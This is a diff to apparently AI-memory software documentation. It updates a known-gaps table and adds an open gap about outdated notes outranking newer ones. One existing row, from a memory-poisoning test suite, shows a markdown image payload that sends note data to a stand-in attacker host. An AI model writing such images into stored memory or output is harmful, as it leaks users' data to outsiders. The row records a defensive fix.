@@ -582,7 +582,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 [docs/replacing-memories.md](./replacing-memories.md).
 
 **Known gaps.** Scenarios that fail because Monomem lacks the behaviour are kept, marked, and listed here and in the report. They do not fail the run
-(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, 2.0.0). **None is open.**
+(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, 2.0.0). **One is open:** `GAP-OBSOLETE-UNREPLACED` (A33, added in 1.5.0).
 
 | Gap | What was missing | Status | Scenarios |
 |---|---|---|---|
@@ -592,6 +592,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 | `GAP-REST-CAS` | The REST `PUT /notes/:id` ignored `if_rev`. | **Fixed in 1.5.0**: it takes `if_rev` and answers 409. | B16 (passes) |
 | `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
 | `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in 2.0.0**: a remote markdown image with a query string is held in quarantine; README badge hosts are exempt. | E11 (now passes) |
+| `GAP-OBSOLETE-UNREPLACED` | A later note updates a fact in different words and nobody replaces the old note: keyword search and the "what is relevant" lookup rank the **old** note first (it matches as well and is shorter). | **Open.** The two-step replace (A34) removes the old value everywhere; session start already carries the new value. | A33 (known gap) |
 
 **Round 1 retrieval changes, 2026-11-05 (no change in these numbers).** The session-start context now uses one
 any-keyword search instead of one per keyword; "how many / total / every / list all" questions return twice the
